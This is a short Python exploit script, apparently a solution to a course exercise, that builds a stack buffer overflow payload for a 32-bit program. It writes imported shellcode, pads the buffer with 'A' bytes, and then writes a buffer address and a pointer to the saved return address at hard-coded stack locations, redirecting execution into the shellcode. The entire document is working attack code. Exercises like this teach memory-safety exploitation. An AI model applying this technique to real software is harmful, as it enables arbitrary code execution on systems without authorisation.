#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
buf_size = 2048
padding_size = buf_size - len(shellcode)
ebp = 0xfffeec58
ret_addr_ptr = ebp + 4
p_ptr = ebp - 4
a_ptr = ebp - 8
buf_ptr = 0xfffee448

# First, fill buf with shellcode
sys.stdout.buffer.write(shellcode)

# Then pad to the end
sys.stdout.buffer.write(b"A" * padding_size)

# Now write the desired return address into a
sys.stdout.buffer.write(pack("<I", buf_ptr))


# Finally write the ESP of return address into p
sys.stdout.buffer.write(pack("<I", ret_addr_ptr))

